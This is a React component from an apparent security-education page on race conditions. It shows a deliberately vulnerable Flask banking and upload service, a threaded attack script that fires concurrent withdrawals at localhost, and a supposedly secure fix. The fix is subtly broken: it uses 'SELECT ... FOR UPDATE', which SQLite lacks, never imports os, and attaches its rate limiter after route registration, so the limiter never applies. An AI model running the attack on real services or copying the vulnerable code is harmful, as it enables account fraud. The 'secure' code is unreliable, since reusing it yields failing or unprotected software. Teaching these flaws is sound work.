
import React from 'react';
import CodeExample from '@/components/CodeExample';

const RaceConditionsCodeExamples: React.FC = () => {
  return (
    <>
      <CodeExample 
        language="python" 
        isVulnerable={true}
        title="Vulnerable Banking System (Python/Flask)" 
        code={`from flask import Flask, request, jsonify
import sqlite3
import threading
import time

app = Flask(__name__)
DATABASE = 'bank.db'

def get_connection():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/api/withdraw', methods=['POST'])
def withdraw():
    user_id = request.json.get('user_id')
    amount = request.json.get('amount')
    
    if not user_id or not amount or amount <= 0:
        return jsonify({'error': 'Invalid request parameters'}), 400
    
    conn = get_connection()
    cursor = conn.cursor()
    
    # VULNERABILITY: Time-of-check to time-of-use (TOCTOU)
    # Step 1: Check current balance
    cursor.execute('SELECT balance FROM accounts WHERE user_id = ?', (user_id,))
    account = cursor.fetchone()
    
    if not account:
        conn.close()
        return jsonify({'error': 'Account not found'}), 404
    
    current_balance = account['balance']
    
    # Artificial delay to increase race condition window
    time.sleep(0.1)  # Simulates processing time
    
    # Step 2: Validate sufficient funds
    if current_balance < amount:
        conn.close()
        return jsonify({'error': 'Insufficient funds'}), 400
    
    # Step 3: Update balance (vulnerable window)
    new_balance = current_balance - amount
    cursor.execute(
        'UPDATE accounts SET balance = ? WHERE user_id = ?',
        (new_balance, user_id)
    )
    
    conn.commit()
    conn.close()
    
    return jsonify({
        'success': True, 
        'new_balance': new_balance,
        'withdrawn': amount
    })

# Example of vulnerable file upload with race condition
@app.route('/api/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    filename = file.filename
    
    # Save file first (vulnerable)
    upload_path = f"uploads/{filename}"
    file.save(upload_path)
    
    # Validate file after saving (race condition window)
    if not validate_file(upload_path):
        os.remove(upload_path)  # Too late - file already accessible
        return jsonify({'error': 'Invalid file type'}), 400
    
    return jsonify({'success': True, 'filename': filename})

def validate_file(filepath):
    # Slow validation process
    time.sleep(0.5)
    allowed_extensions = ['.jpg', '.png', '.pdf']
    return any(filepath.endswith(ext) for ext in allowed_extensions)`} 
      />

      <div className="mb-6">
        <p className="font-semibold mb-2">Attack Script for Banking Vulnerability:</p>
        <div className="bg-red-900/20 p-4 rounded-lg">
          <pre className="text-sm">
{`import requests
import threading
import json

# Exploit script for concurrent withdrawal attack
def exploit_race_condition():
    target_url = "http://localhost:5000/api/withdraw"
    user_id = "victim_user"
    withdraw_amount = 100  # User only has $100
    
    def send_withdrawal():
        payload = {
            "user_id": user_id,
            "amount": withdraw_amount
        }
        response = requests.post(target_url, json=payload)
        print(f"Response: {response.status_code} - {response.text}")
    
    # Send 10 simultaneous requests
    threads = []
    for i in range(10):
        thread = threading.Thread(target=send_withdrawal)
        threads.append(thread)
    
    # Start all threads simultaneously
    for thread in threads:
        thread.start()
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()

exploit_race_condition()`}
          </pre>
        </div>
      </div>
      
      <CodeExample 
        language="python" 
        isVulnerable={false}
        title="Secure Banking Implementation" 
        code={`from flask import Flask, request, jsonify
import sqlite3
import threading
from contextlib import contextmanager
import uuid
import time

app = Flask(__name__)
DATABASE = 'bank.db'

# Thread-safe connection pool
connection_lock = threading.Lock()

@contextmanager
def get_db_transaction():
    """Context manager for database transactions with proper locking"""
    conn = sqlite3.connect(DATABASE, timeout=30.0)
    conn.row_factory = sqlite3.Row
    conn.execute('BEGIN IMMEDIATE')  # Acquire write lock immediately
    try:
        yield conn
        conn.commit()
    except Exception as e:
        conn.rollback()
        raise e
    finally:
        conn.close()

@app.route('/api/withdraw', methods=['POST'])
def withdraw_secure():
    user_id = request.json.get('user_id')
    amount = request.json.get('amount')
    
    if not user_id or not amount or amount <= 0:
        return jsonify({'error': 'Invalid request parameters'}), 400
    
    try:
        with get_db_transaction() as conn:
            cursor = conn.cursor()
            
            # Lock the account row for update (prevents concurrent access)
            cursor.execute('''
                SELECT balance, version FROM accounts 
                WHERE user_id = ? 
                FOR UPDATE
            ''', (user_id,))
            
            account = cursor.fetchone()
            
            if not account:
                return jsonify({'error': 'Account not found'}), 404
            
            current_balance = account['balance']
            current_version = account['version']
            
            # Atomic check and update within same transaction
            if current_balance < amount:
                return jsonify({'error': 'Insufficient funds'}), 400
            
            new_balance = current_balance - amount
            new_version = current_version + 1
            
            # Update with version check (optimistic locking)
            cursor.execute('''
                UPDATE accounts 
                SET balance = ?, version = ?, last_updated = datetime('now')
                WHERE user_id = ? AND version = ?
            ''', (new_balance, new_version, user_id, current_version))
            
            if cursor.rowcount == 0:
                return jsonify({'error': 'Concurrent modification detected'}), 409
            
            # Log transaction for audit
            transaction_id = str(uuid.uuid4())
            cursor.execute('''
                INSERT INTO transactions (id, user_id, type, amount, balance_after)
                VALUES (?, ?, 'withdrawal', ?, ?)
            ''', (transaction_id, user_id, amount, new_balance))
            
            return jsonify({
                'success': True,
                'transaction_id': transaction_id,
                'new_balance': new_balance,
                'withdrawn': amount
            })
            
    except sqlite3.OperationalError as e:
        if 'database is locked' in str(e):
            return jsonify({'error': 'System busy, please try again'}), 503
        raise e

# Secure file upload implementation
@app.route('/api/upload_secure', methods=['POST'])
def upload_file_secure():
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    original_filename = file.filename
    
    # Generate secure filename
    file_id = str(uuid.uuid4())
    temp_filename = f"{file_id}.tmp"
    temp_path = f"temp/{temp_filename}"
    
    try:
        # Save to temporary location first
        file.save(temp_path)
        
        # Validate file before making it accessible
        if not validate_file_secure(temp_path):
            os.remove(temp_path)
            return jsonify({'error': 'Invalid file type'}), 400
        
        # Only after validation, move to final location
        final_filename = f"{file_id}_{original_filename}"
        final_path = f"uploads/{final_filename}"
        os.rename(temp_path, final_path)
        
        return jsonify({
            'success': True, 
            'file_id': file_id,
            'filename': final_filename
        })
        
    except Exception as e:
        # Cleanup on error
        if os.path.exists(temp_path):
            os.remove(temp_path)
        return jsonify({'error': 'Upload failed'}), 500

def validate_file_secure(filepath):
    """Comprehensive file validation"""
    import magic  # python-magic library for proper file type detection
    
    # Check file size
    if os.path.getsize(filepath) > 10 * 1024 * 1024:  # 10MB limit
        return False
    
    # Check actual file type (not just extension)
    file_type = magic.from_file(filepath, mime=True)
    allowed_types = ['image/jpeg', 'image/png', 'application/pdf']
    
    if file_type not in allowed_types:
        return False
    
    # Additional security checks
    with open(filepath, 'rb') as f:
        header = f.read(1024)
        # Check for suspicious content patterns
        suspicious_patterns = [b'<?php', b'<script', b'eval(']
        if any(pattern in header for pattern in suspicious_patterns):
            return False
    
    return True

# Rate limiting to prevent abuse
from functools import wraps
from collections import defaultdict

request_counts = defaultdict(list)

def rate_limit(max_requests=5, window=60):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            client_ip = request.remote_addr
            now = time.time()
            
            # Clean old requests
            request_counts[client_ip] = [
                req_time for req_time in request_counts[client_ip]
                if now - req_time < window
            ]
            
            # Check rate limit
            if len(request_counts[client_ip]) >= max_requests:
                return jsonify({'error': 'Rate limit exceeded'}), 429
            
            request_counts[client_ip].append(now)
            return f(*args, **kwargs)
        return wrapper
    return decorator

# Apply rate limiting to sensitive endpoints
withdraw_secure = rate_limit(max_requests=3, window=60)(withdraw_secure)`} 
      />
    </>
  );
};

export default RaceConditionsCodeExamples;
